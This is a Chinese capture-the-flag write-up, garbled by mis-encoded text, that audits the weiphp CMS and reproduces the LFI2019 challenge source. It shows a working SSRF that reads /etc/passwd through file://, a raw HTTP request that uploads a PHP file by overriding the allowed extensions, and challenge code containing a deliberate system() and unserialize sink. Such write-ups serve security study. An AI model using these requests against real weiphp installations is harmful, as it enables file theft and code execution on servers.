æ‰è¡Œ\u0026hellip;è¿™é¢˜ä¹Ÿæ²¡å•¥å¥½è¯´çš„\u0026hellip;æ„Ÿè§‰å…¨åœºå”¯ä¸€çš„æ§½ç‚¹(Web)å°±æ˜¯è¿™ä¸ªäº†ã€‚\nweiphp ä¸€ä¸ªå« weiphp çš„ CMS å®¡è®¡ï¼Œè¿™ä¸ªä¸»è¦æ˜¯é˜Ÿå‹çœ‹çš„ï¼Œæˆ‘å½“æ—¶åšå¦å¤–ä¸€é“é¢˜å»äº†ã€‚æˆ‘ä»¬å‡ºçš„æ˜¯ä¸€ä¸ª ssrf çš„åœ°æ–¹ï¼Œèµ›åé—®äº†å‡ºçš„å¸ˆå‚…ï¼Œæ˜¯å®¡äº†ä¸Šä¼ çš„åœ°æ–¹ã€‚\nSSRF æˆ‘ä»¬å…¨å±€æœcurlï¼Œå¯ä»¥åœ¨ Base.php ä¸­å‘ç°æœ‰ä»¥ä¸‹ä»£ç ï¼š\npublic function post_data($url, $param, $type = \u0026#39;json\u0026#39;, $return_array = true, $useCert = []) { $res = post_data($url, $param, $type, $return_array, $useCert); // å„ç§å¸¸è§é”™è¯¯åˆ¤æ–­  if (isset($res[\u0026#39;curl_erron\u0026#39;])) { $this-\u0026gt;error($res[\u0026#39;curl_erron\u0026#39;] . \u0026#39;: \u0026#39; . $res[\u0026#39;curl_error\u0026#39;]); } if ($return_array) { if (isset($res[\u0026#39;errcode\u0026#39;]) \u0026amp;\u0026amp; $res[\u0026#39;errcode\u0026#39;] != 0) { $this-\u0026gt;error(error_msg($res)); } elseif (isset($res[\u0026#39;return_code\u0026#39;]) \u0026amp;\u0026amp; $res[\u0026#39;return_code\u0026#39;] == \u0026#39;FAIL\u0026#39; \u0026amp;\u0026amp; isset($res[\u0026#39;return_msg\u0026#39;])) { $this-\u0026gt;error($res[\u0026#39;return_msg\u0026#39;]); } elseif (isset($res[\u0026#39;result_code\u0026#39;]) \u0026amp;\u0026amp; $res[\u0026#39;result_code\u0026#39;] == \u0026#39;FAIL\u0026#39; \u0026amp;\u0026amp; isset($res[\u0026#39;err_code\u0026#39;]) \u0026amp;\u0026amp; isset($res[\u0026#39;err_code_des\u0026#39;])) { $this-\u0026gt;error($res[\u0026#39;err_code\u0026#39;] . \u0026#39;: \u0026#39; . $res[\u0026#39;err_code_des\u0026#39;]); } } return $res; } è·Ÿè¿›ç¬¬ä¸‰è¡Œçš„post_dataï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ common.php ä¸­æ‰¾åˆ°è¯¥å‡½æ•°ï¼š\nfunction post_data($url, $param = [], $type = \u0026#39;json\u0026#39;, $return_array = true, $useCert = []) { $has_json = false; if ($type == \u0026#39;json\u0026#39; \u0026amp;\u0026amp; is_array($param)) { $has_json = true; $param = json_encode($param, JSON_UNESCAPED_UNICODE); } elseif ($type == \u0026#39;xml\u0026#39; \u0026amp;\u0026amp; is_array($param)) { $param = ToXml($param); } add_debug_log($url, \u0026#39;post_data\u0026#39;); // åˆå§‹åŒ–curl  $ch = curl_init(); if ($type != \u0026#39;file\u0026#39;) { add_debug_log($param, \u0026#39;post_data\u0026#39;); // è®¾ç½®è¶…æ—¶  curl_setopt($ch, CURLOPT_TIMEOUT, 30); } else { // è®¾ç½®è¶…æ—¶  curl_setopt($ch, CURLOPT_TIMEOUT, 180); } curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_POST, true); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false); // è®¾ç½®header  if ($type == \u0026#39;file\u0026#39;) { $header[] = \u0026#34;content-type: multipart/form-data; charset=UTF-8\u0026#34;; curl_setopt($ch, CURLOPT_HTTPHEADER, $header); } elseif ($type == \u0026#39;xml\u0026#39;) { curl_setopt($ch, CURLOPT_HEADER, false); } elseif ($has_json) { $header[] = \u0026#34;content-type: application/json; charset=UTF-8\u0026#34;; curl_setopt($ch, CURLOPT_HTTPHEADER, $header); } // curl_setopt($ch, CURLOPT_USERAGENT, \u0026#39;Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)\u0026#39;);  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); curl_setopt($ch, CURLOPT_AUTOREFERER, 1); // dump($param);  curl_setopt($ch, CURLOPT_POSTFIELDS, $param); // è¦æ±‚ç»“æœä¸ºå­—ç¬¦ä¸²ä¸”è¾“å‡ºåˆ°å±å¹•ä¸Š  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); // ä½¿ç”¨è¯ä¹¦ï¼šcert ä¸ key åˆ†åˆ«å±äºä¸¤ä¸ª.pemæ–‡ä»¶  if (isset($useCert[\u0026#39;certPath\u0026#39;]) \u0026amp;\u0026amp; isset($useCert[\u0026#39;keyPath\u0026#39;])) { curl_setopt($ch, CURLOPT_SSLCERTTYPE, \u0026#39;PEM\u0026#39;); curl_setopt($ch, CURLOPT_SSLCERT, $useCert[\u0026#39;certPath\u0026#39;]); curl_setopt($ch, CURLOPT_SSLKEYTYPE, \u0026#39;PEM\u0026#39;); curl_setopt($ch, CURLOPT_SSLKEY, $useCert[\u0026#39;keyPath\u0026#39;]); } $res = curl_exec($ch); if ($type != \u0026#39;file\u0026#39;) { add_debug_log($res, \u0026#39;post_data\u0026#39;); } // echo $res;die;  $flat = curl_errno($ch); $msg = \u0026#39;\u0026#39;; if ($flat) { $msg = curl_error($ch); } // add_request_log($url, $param, $res, $flat, $msg);  if ($flat) { return [ \u0026#39;curl_erron\u0026#39; =\u0026gt; $flat, \u0026#39;curl_error\u0026#39; =\u0026gt; $msg ]; } else { if ($return_array \u0026amp;\u0026amp; !empty($res)) { $res = $type == \u0026#39;json\u0026#39; ? json_decode($res, true) : FromXml($res); } return $res; } } å¯ä»¥çœ‹åˆ° common.php ä¸­çš„æ²¡æœ‰ä»€ä¹ˆè¿‡æ»¤ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦æ‰¾å¼•ç”¨ Base.php å½“ä¸­çš„post_dataå‡½æ•°çš„åœ°æ–¹å°±è¡Œäº†ã€‚æˆ‘ä»¬éšä¾¿ç™»å½•ä¸€ä¸‹å°±å¯ä»¥å‘ç°å…¶è·¯ç”±è§„åˆ™äº†ï¼Œæ¯”å¦‚ç™»å½•è·¯ç”±æ˜¯index.php/home/user/loginï¼Œå¯¹åº”çš„æ˜¯application/home/controller/User.phpå½“ä¸­çš„login()æ–¹æ³•ï¼Œè€Œ Base.php è·Ÿå…¶ä»– controller æœ‰ä»¥ä¸‹ç»§æ‰¿å…³ç³»ï¼š\nhome/controller/User.php -\u0026gt; home/controller/Home.php -\u0026gt; common/controller/WebBase.php -\u0026gt; common/controller/Base.php æ‰€ä»¥post_dataä¸º public æ–¹æ³•ä¹Ÿå¯ä»¥ç›´æ¥è°ƒç”¨ï¼Œæ‰€ä»¥æ ¹æ®post_dataæ–¹æ³•çš„å‚æ•°ï¼Œæˆ‘ä»¬éœ€è¦ä¼ å…¥å‡ ä¸ªå‚æ•°ï¼Œurlä¸º SSRF çš„ç‚¹ï¼Œparaméšç¬”å³å¯ã€‚\nè¿™é‡Œç”±äº cms å¼€å¯äº† debug ï¼Œè¿™é‡Œè¦æŠŠtypeå‚æ•°è®¾ä¸ºfileï¼Œè®©post_dataå‡½æ•°åœ¨è°ƒç”¨FromXmlå‡½æ•°çš„æ—¶å€™ï¼Œç”±äºæˆ‘ä»¬ä¼ å…¥è¯¸å¦‚url=file:///etc/passwdçš„å‚æ•°ï¼Œä¼šå¯¼è‡´simple_xml_load_stringå‡ºé”™\n/** * å°†xmlè½¬ä¸ºarray */ function FromXml($xml) { if (!$xml) { exception(\u0026#34;xmlæ•°æ®å¼‚å¸¸ï¼\u0026#34;); } file_log($xml, \u0026#39;FromXml\u0026#39;); // è§£å†³éƒ¨åˆ†jsonæ•°æ®è¯¯å…¥çš„é—®é¢˜  $arr = json_decode($xml, true); if (is_array($arr) \u0026amp;\u0026amp; !empty($arr)) { return $arr; } // å°†XMLè½¬ä¸ºarray  $arr = json_decode(json_encode(simplexml_load_string($xml, \u0026#39;SimpleXMLElement\u0026#39;, LIBXML_NOCDATA)), true); return $arr; }  \nå¯ä»¥çœ‹åˆ°åœ¨å›¾ä¸­å·²ç»æ‹¿åˆ°äº†æ–‡ä»¶å†…å®¹å›æ˜¾ï¼Œæ‰€ä»¥å½“æ—¶æˆ‘ä»¬å°±ç”¨è¿™ä¸ª SSRF æ‹¿åˆ°äº† flag\n \nupload åœ¨application/home/controller/File.phpæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰è¿™ä¹ˆä¸€ä¸ªæ–¹æ³•\n/* æ–‡ä»¶ä¸Šä¼  åˆ°æ ¹ç›®å½• */ public function upload_root() { $return = array( \u0026#39;status\u0026#39; =\u0026gt; 1, \u0026#39;info\u0026#39; =\u0026gt; \u0026#39;ä¸Šä¼ æˆåŠŸ\u0026#39;, \u0026#39;data\u0026#39; =\u0026gt; \u0026#39;\u0026#39; ); /* è°ƒç”¨æ–‡ä»¶ä¸Šä¼ ç»„ä»¶ä¸Šä¼ æ–‡ä»¶ */ $File = D(\u0026#39;home/File\u0026#39;); $file_driver = strtolower(config(\u0026#39;picture_upload_driver\u0026#39;)); $setting = array ( \u0026#39;rootPath\u0026#39; =\u0026gt; \u0026#39;./\u0026#39; , ); $info = $File-\u0026gt;upload($setting, config(\u0026#39;picture_upload_driver\u0026#39;), config(\u0026#34;upload_{$file_driver}_config\u0026#34;)); // $info = $File-\u0026gt;upload(config(\u0026#39;download_upload\u0026#39;), config(\u0026#39;picture_upload_driver\u0026#39;), config(\u0026#34;upload_{$file_driver}_config\u0026#34;));  /* è®°å½•é™„ä»¶ä¿¡æ¯ */ if ($info) { $return[\u0026#39;status\u0026#39;] = 1; $return = array_merge($info[\u0026#39;download\u0026#39;], $return); } else { $return[\u0026#39;status\u0026#39;] = 0; $return[\u0026#39;info\u0026#39;] = $File-\u0026gt;getError(); } /* è¿”å›JSONæ•°æ® */ return json_encode($return); } å…¶ä¸­æ˜¯è°ƒç”¨äº†application/home/model/File.phpä¸­çš„ä¸€ä¸ªuploadå‡½æ•°\npublic function upload($setting = [], $driver = \u0026#39;Local\u0026#39;, $config = null, $isTest = false) { ... $info = upload_files($setting, $driver, $config, \u0026#39;download\u0026#39;, $isTest); ... } è¿™ä¸ªå‡½æ•°åˆè°ƒç”¨äº†application/common.phpå½“ä¸­çš„upload_fileså‡½æ•°ï¼Œç„¶åæˆ‘ä»¬å¯ä»¥å‘ç°åˆè¿™ä¹ˆä¸€æ®µç¥å¥‡çš„ä»£ç ï¼š\nif ($type == \u0026#39;picture\u0026#39;) { //å›¾ç‰‡æ‰©å±•åéªŒè¯ ï¼Œå›¾ç‰‡å¤§å°ä¸è¶…è¿‡20M  $checkRule[\u0026#39;ext\u0026#39;] = \u0026#39;gif,jpg,jpeg,png,bmp\u0026#39;; $checkRule[\u0026#39;size\u0026#39;] = 20971520; } else { $allowExt = input(\u0026#39;allow_file_ext\u0026#39;, \u0026#39;\u0026#39;); if ($allowExt != \u0026#39;\u0026#39;) { $checkRule[\u0026#39;ext\u0026#39;] = $allowExt; } $allowSize = input(\u0026#39;allow_file_maxsize\u0026#39;, \u0026#39;\u0026#39;); if ($allowSize \u0026gt; 0) { $checkRule[\u0026#39;size\u0026#39;] = $allowSize; } } è¿™é‡Œinput('allow_file_ext', '');è¡¨ç¤ºæˆ‘ä»¬å¯ä»¥è®¾ç½®å…è®¸ä¸Šä¼ çš„ç±»å‹\u0026hellip;ç„¶åæˆ‘ä»¬éšä¾¿ä¸Šä¼ ä¸€ä¸ªè¯•è¯•\nPOST /weiphp/public/index.php/home/file/upload_root HTTP/1.1 Host: zedd.vv User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: multipart/form-data; boundary=---------------------------6593480186465200061941970669 Content-Length: 480 Origin: http://zedd.vv Connection: close Referer: http://zedd.vv/upload.html Cookie: PHPSESSID=0cfb281c78e25924ebb7c8abe9084590 Upgrade-Insecure-Requests: 1 -----------------------------6593480186465200061941970669 Content-Disposition: form-data; name=\u0026#34;name\u0026#34;; filename=\u0026#34;1.phtml\u0026#34; Content-Type: text/php \u0026lt;?php phpinfo();?\u0026gt; -----------------------------6593480186465200061941970669 Content-Disposition: form-data; name=\u0026#34;allow_file_ext\u0026#34; phtml -----------------------------6593480186465200061941970669 Content-Disposition: form-data; name=\u0026#34;allow_file_maxsize\u0026#34; 1024 -----------------------------6593480186465200061941970669-- è™½ç„¶æŠ¥é”™äº†ä½†æ˜¯æˆ‘ä»¬ä¾ç„¶ä¸Šä¼ æˆåŠŸäº†ï¼Œç›´æ¥è®¿é—®é‚£ä¸ªè·¯å¾„å³å¯ã€‚\n \n \nlfi2019 åœ¨ header å¤´æœ‰ä¸€ä¸ªæç¤ºå¯ä»¥æ‹¿åˆ°æºç \nX-Hint: /index.php?show-me-the-hint \u0026lt;?php /* Developed by stypr. Made in 2018, Releasing in 2019! */ // Baka flag-sama and seed-chan! //  error_reporting(0); ini_set(\u0026#34;display_errors\u0026#34;,\u0026#34;off\u0026#34;); @require(\u0026#39;flag.php\u0026#39;); $seed = md5(rand(PHP_INT_MIN,PHP_INT_MAX)); if($flag === $_GET[\u0026#39;trigger\u0026#39;]){ die(hash(\u0026#34;sha256\u0026#34;, $seed . $flag)); } // Sessions are never used but we add that //  ini_set(\u0026#39;session.cookie_httponly\u0026#39;, 1); @phpinfo(); ini_set(\u0026#39;session.cookie_secure\u0026#39;, 1); @phpinfo(); ini_set(\u0026#39;session.use_only_cookies\u0026#39;,1); @phpinfo(); ini_set(\u0026#39;session.gc_probability\u0026#39;, 1); @phpinfo(); // but really, you can\u0026#39;t really do something with sessions. //  session_save_path(\u0026#39;./sess/\u0026#39;); session_name(\u0026#34;lfi2019\u0026#34;); session_start(); session_destroy(); // Flush directory for security purposes //  // Referenced it from StackOverflow: https://bit.ly/2MxvxXE //  function rrmdir($dir, $depth=0){ if (is_dir($dir)){ $objects = scandir($dir); foreach ($objects as $object){ if ($object != \u0026#34;.\u0026#34; \u0026amp;\u0026amp; $object != \u0026#34;..\u0026#34;){ if(is_dir($dir.\u0026#34;/\u0026#34;.$object)) rrmdir($dir.\u0026#34;/\u0026#34;.$object, $depth + 1); else unlink($dir.\u0026#34;/\u0026#34;.$object); } } } if($depth != 0) rmdir($dir); } function countdir($dir){ if (is_dir($dir)){ $objects = scandir($dir); foreach ($objects as $object){ if ($object != \u0026#34;.\u0026#34; \u0026amp;\u0026amp; $object != \u0026#34;..\u0026#34;){ $count += 1; if(is_dir($dir.\u0026#34;/\u0026#34;.$object)) $count += countdir($dir.\u0026#34;/\u0026#34;.$object); } } } return $count; } var_dump(countdir(\u0026#34;./files\u0026#34;)); if(countdir(\u0026#34;./files/\u0026#34;) \u0026gt;= 100) @rrmdir(\u0026#34;./files/\u0026#34;); // Here, kawaii path-san for you! //  function path_sanitizer($dir, $harden=false){ $dir = (string)$dir; $dir_len = strlen($dir); // Deny LFI/RFI/XSS //  $filter = [\u0026#39;.\u0026#39;, \u0026#39;./\u0026#39;, \u0026#39;~\u0026#39;, \u0026#39;.\\\\\u0026#39;, \u0026#39;#\u0026#39;, \u0026#39;\u0026lt;\u0026#39;, \u0026#39;\u0026gt;\u0026#39;]; foreach($filter as $f){ if(stripos($dir, $f) !== false){ return false; } } // Deny SSRF and all possible weird bypasses //  $stream = stream_get_wrappers(); $stream = array_merge($stream, stream_get_transports()); $stream = array_merge($stream, stream_get_filters()); foreach($stream as $f){ $f_len = strlen($f); if(substr($dir, 0, $f_len) === $f){ return false; } } // Deny length //  if($dir_len \u0026gt;= 128){ return false; } // Easy level hardening // \tif($harden){ $harden_filter = [\u0026#34;/\u0026#34;, \u0026#34;\\\\\u0026#34;]; foreach($harden_filter as $f){ $dir = str_replace($f, \u0026#34;\u0026#34;, $dir); } } // Sanitize feature is available starting from the medium level //  return $dir; } // The new kakkoii code-san is re-implemented. //  function code_sanitizer($code){ // Computer-chan, please don\u0026#39;t speak english. Speak something else! //  $code = preg_replace(\u0026#34;/[^\u0026lt;\u0026gt;!@#$%\\^\u0026amp;*\\_?+\\.\\-\\\\\\\u0026#39;\\\u0026#34;\\=\\(\\)\\[\\]\\;]/u\u0026#34;, \u0026#34;*Nope*\u0026#34;, (string)$code); return $code; } // Errors are intended and straightforward. Please do not ask questions. //  class Get { protected function nanahira(){ // senpai notice me //  function exploit($data){ $exploit = new System(); } $_GET[\u0026#39;trigger\u0026#39;] \u0026amp;\u0026amp; !@@@@@@@@@@@@@exploit($$$$$$_GET[\u0026#39;leak\u0026#39;][\u0026#39;leak\u0026#39;]); } private $filename; function __construct($filename){ $this-\u0026gt;filename = path_sanitizer($filename); } function get(){ if($this-\u0026gt;filename === false){ return [\u0026#34;msg\u0026#34; =\u0026gt; \u0026#34;blocked by path sanitizer\u0026#34;, \u0026#34;type\u0026#34; =\u0026gt; \u0026#34;error\u0026#34;]; } // wtf???? //  if(!@file_exists($this-\u0026gt;filename)){ // index files are *completely* disabled. //  if(stripos($this-\u0026gt;filename, \u0026#34;index\u0026#34;) !== false){ return [\u0026#34;msg\u0026#34; =\u0026gt; \u0026#34;you cannot include index files!\u0026#34;, \u0026#34;type\u0026#34; =\u0026gt; \u0026#34;error\u0026#34;]; } // hardened sanitizer spawned. thus we sense ambiguity //  $read_file = \u0026#34;./files/\u0026#34; . $this-\u0026gt;filename; $read_file_with_hardened_filter = \u0026#34;./files/\u0026#34; . path_sanitizer($this-\u0026gt;filename, true); if($read_file === $read_file_with_hardened_filter || @file_get_contents($read_file) === @file_get_contents($read_file_with_hardened_filter)){ return [\u0026#34;msg\u0026#34; =\u0026gt; \u0026#34;request blocked\u0026#34;, \u0026#34;type\u0026#34; =\u0026gt; \u0026#34;error\u0026#34;]; } // .. and finally, include *un*exploitable file is included. //  @include(\u0026#34;./files/\u0026#34; . $this-\u0026gt;filename); return [\u0026#34;type\u0026#34; =\u0026gt; \u0026#34;success\u0026#34;]; }else{ return [\u0026#34;msg\u0026#34; =\u0026gt; \u0026#34;invalid filename (wtf)\u0026#34;, \u0026#34;type\u0026#34; =\u0026gt; \u0026#34;error\u0026#34;]; } } } class Put { protected function nanahira(){ // senpai notice me //  function exploit($data){ $exploit = new System(); } $_GET[\u0026#39;trigger\u0026#39;] \u0026amp;\u0026amp; !@@@@@@@@@@@@@exploit($$$$$$_GET[\u0026#39;leak\u0026#39;][\u0026#39;leak\u0026#39;]); } private $filename; private $content; private $dir = \u0026#34;./files/\u0026#34;; function __construct($filename, $data){ global $seed; if((string)$filename === (string)@path_sanitizer($data[\u0026#39;filename\u0026#39;])){ $this-\u0026gt;filename = (string)$filename; }else{ $this-\u0026gt;filename = false; } $this-\u0026gt;content = (string)@code_sanitizer($data[\u0026#39;content\u0026#39;]); } function put(){ // just another typical file insertion //  if($this-\u0026gt;filename === false){ return [\u0026#34;msg\u0026#34; =\u0026gt; \u0026#34;blocked by path sanitizer\u0026#34;, \u0026#34;type\u0026#34; =\u0026gt; \u0026#34;error\u0026#34;]; } // check if file exists //  if(file_exists($this-\u0026gt;dir . $this-\u0026gt;filename)){ return [\u0026#34;msg\u0026#34; =\u0026gt; \u0026#34;file exists\u0026#34;, \u0026#34;type\u0026#34; =\u0026gt; \u0026#34;error\u0026#34;]; } file_put_contents($this-\u0026gt;dir . $this-\u0026gt;filename, $this-\u0026gt;content); // just check if file is written. hopefully. //  if(@file_get_contents($this-\u0026gt;dir . $this-\u0026gt;filename) == \u0026#34;\u0026#34;){ return [\u0026#34;msg\u0026#34; =\u0026gt; \u0026#34;file not written.\u0026#34;, \u0026#34;type\u0026#34; =\u0026gt; \u0026#34;error\u0026#34;]; } return [\u0026#34;type\u0026#34; =\u0026gt; \u0026#34;success\u0026#34;]; } } // Triggering this is nearly impossible //  class System { function __destruct(){ global $seed; // ain\u0026#39;t Argon2, ain\u0026#39;t pbkdf2. what could go wrong?  $flag = hash(\u0026#39;sha256\u0026#39;, $seed); if($_GET[$flag]){ @system($_GET[$flag]); }else{ @unserialize($_SESSION[$flag]); } } } // Don\u0026#39;t call me a savage... I gave everything you need //  if($_SERVER[\u0026#39;QUERY_STRING\u0026#39;] === \u0026#34;show-me-the-hint\u0026#34;){ show_source(__FILE__); exit; } // XSS protection and hints ^-^ //  header(\u0026#39;X-Hint: /index.php?show-me-the-hint\u0026#39;); header(\u0026#39;X-Frame-Options: DENY\u0026#39;); header(\u0026#39;X-XSS-Protection: 1; mode=block;\u0026#39;); header(\u0026#39;X-Content-Type-Options: nosniff\u0026#39;); header(\u0026#39;Content-Type: text/html; charset=utf-8\u0026#39;); header(\u0026#39;Cache-Control: no-store, no-cache, must-revalidate, max-age=0\u0026#39;); //header(\u0026#34;Content-Security-Policy: default-src \u0026#39;self\u0026#39;; script-src \u0026#39;nonce-${seed}\u0026#39; \u0026#39;unsafe-eval\u0026#39;;\u0026#34; .  //\u0026#34;font-src \u0026#39;nonce-${seed}\u0026#39; fonts.gstatic.com; style-src \u0026#39;nonce-${seed}\u0026#39; fonts.googleapis.com;\u0026#34;);  // Hello, JSON! //  $parsed_url = explode(\u0026#34;\u0026amp;\u0026#34;, $_SERVER[\u0026#39;QUERY_STRING\u0026#39;]); if(count($parsed_url) \u0026gt;= 2){ header(\u0026#34;Content-Type:text/json\u0026#34;); switch($parsed_url[0]){ case \u0026#34;get\u0026#34;: $get = new Get($parsed_url[1]); $data = $get-\u0026gt;get(); break; case \u0026#34;put\u0026#34;: $put = new Put($parsed_url[1], $_POST); $data = $put-\u0026gt;put(); break; default: $data = [\u0026#34;msg\u0026#34; =\u0026gt; \u0026#34;Invalid data.\u0026#34;]; break; } die(json_encode($data)); } ?\u0026gt;\u0026lt;!doctype html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=utf-8\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;//stackpath.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css\u0026#34; nonce=\u0026#34;\u0026lt;?php echo $seed; ?\u0026gt;\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;styleshhet\u0026#34; href=\u0026#34;//fonts.googleapis.com/css?family=Muli:300,400,700\u0026#34; nonce=\u0026#34;\u0026lt;?php echo $seed; ?\u0026gt;\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;./static/legit.css\u0026#34; nonce=\u0026#34;\u0026lt;?php echo $seed; ?\u0026gt;\u0026#34;\u0026gt; \u0026lt;title\u0026gt;LFI2019\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;modal fade\u0026#34; id=\u0026#34;put-modal\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;modal-dialog modal-lg\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;modal-content\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;modal-header\u0026#34;\u0026gt; \u0026lt;h5 class=\u0026#34;modal-title\u0026#34;\u0026gt;put2019\u0026lt;/h5\u0026gt; \u0026lt;button type=\u0026#34;button\u0026#34; class=\u0026#34;close\u0026#34; data-dismiss=\u0026#34;modal\u0026#34; aria-label=\u0026#34;Close\u0026#34;\u0026gt; \u0026lt;span aria-hidden=\u0026#34;true\u0026#34;\u0026gt;\u0026amp;times;\u0026lt;/span\u0026gt; \u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;modal-body\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;form-group\u0026#34;\u0026gt; \u0026lt;label for=\u0026#34;upload-filename\u0026#34; class=\u0026#34;col-form-label\u0026#34;\u0026gt;Filename:\u0026lt;/label\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; class=\u0026#34;form-control\u0026#34; id=\u0026#34;upload-filename\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;form-group\u0026#34;\u0026gt; \u0026lt;label for=\u0026#34;upload-content\u0026#34; class=\u0026#34;col-form-label\u0026#34;\u0026gt;Content:\u0026lt;/label\u0026gt; \u0026lt;textarea class=\u0026#34;form-control disabled\u0026#34; id=\u0026#34;upload-content\u0026#34; rows=10\u0026gt;\u0026lt;/textarea\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;modal-footer\u0026#34;\u0026gt; \u0026lt;button type=\u0026#34;button\u0026#34; class=\u0026#34;btn btn-secondary\u0026#34; data-dismiss=\u0026#34;modal\u0026#34;\u0026gt;Close\u0026lt;/button\u0026gt; \u0026lt;button type=\u0026#34;button\u0026#34; class=\u0026#34;btn btn-primary\u0026#34; id=\u0026#34;upload-submit\u0026#34;\u0026gt;put();\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;modal fade\u0026#34; id=\u0026#34;get-modal\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;modal-dialog modal-lg\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;modal-content\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;modal-header\u0026#34;\u0026gt; \u0026lt;h5 class=\u0026#34;modal-title\u0026#34;\u0026gt;get2019\u0026lt;/h5\u0026gt; \u0026lt;button type=\u0026#34;button\u0026#34; class=\u0026#34;close\u0026#34; data-dismiss=\u0026#34;modal\u0026#34; aria-label=\u0026#34;Close\u0026#34;\u0026gt; \u0026lt;span aria-hidden=\u0026#34;true\u0026#34;\u0026gt;\u0026amp;times;\u0026lt;/span\u0026gt; \u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;modal-body\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;form-group\u0026#34;\u0026gt; \u0026lt;label for=\u0026#34;include-filename\u0026#34; class=\u0026#34;col-form-label\u0026#34;\u0026gt;Filename:\u0026lt;/label\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; class=\u0026#34;form-control\u0026#34; id=\u0026#34;include-filename\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;form-group\u0026#34;\u0026gt; \u0026lt;textarea class=\u0026#34;form-control disabled\u0026#34; id=\u0026#34;include-content\u0026#34; disabled rows=10\u0026gt;\u0026lt;/textarea\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;modal-footer\u0026#34;\u0026gt; \u0026lt;button type=\u0026#34;button\u0026#34; class=\u0026#34;btn btn-secondary\u0026#34; data-dismiss=\u0026#34;modal\u0026#34;\u0026gt;Close\u0026lt;/button\u0026gt; \u0026lt;button type=\u0026#34;button\u0026#34; class=\u0026#34;btn btn-primary\u0026#34; id=\u0026#34;include-submit\u0026#34;\u0026gt;include();\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;modal fade\u0026#34; id=\u0026#34;info-modal\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;modal-dialog modal-lg\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;modal-content\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;modal-header\u0026#34;\u0026gt; \u0026lt;button type=\u0026#34;button\u0026#34; class=\u0026#34;close\u0026#34; data-dismiss=\u0026#34;modal\u0026#34; aria-hidden=\u0026#34;true\u0026#34;\u0026gt;Ã—\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;modal-body\u0026#34;\u0026gt; \u0026lt;p\u0026gt; Hi there! We introduce LFI2019 with another technique that never came out on CTFs. We want to end tedious LFI challenges starting from this year. Traps are everywhere, so be warned. Good Luck! \u0026lt;/p\u0026gt; \u0026lt;p\u0026gt; .. and of course, the main objective for this challenge is absolutely straightforward: Leak the sourcecode of flag file to solve this challenge. flag is located at \u0026lt;code\u0026gt;flag.php\u0026lt;/code\u0026gt;. \u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;modal-footer\u0026#34;\u0026gt; \u0026lt;button type=\u0026#34;button\u0026#34; class=\u0026#34;btn btn-default\u0026#34; data-dismiss=\u0026#34;modal\u0026#34;\u0026gt;Close\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;ul class=\u0026#34;text hidden\u0026#34;\u0026gt; \u0026lt;li\u0026gt;L\u0026lt;/li\u0026gt; \u0026lt;li class=\u0026#34;ghost\u0026#34;\u0026gt;e\u0026lt;/li\u0026gt; \u0026lt;li class=\u0026#34;ghost\u0026#34;\u0026gt;g\u0026lt;/li\u0026gt; \u0026lt;li class=\u0026#34;ghost\u0026#34;\u0026gt;i\u0026lt;/li\u0026gt; \u0026lt;li class=\u0026#34;ghost\u0026#34;\u0026gt;t\u0026lt;/li\u0026gt; \u0026lt;li class=\u0026#34;spaced\u0026#34;\u0026gt;F\u0026lt;/li\u0026gt; \u0026lt;li 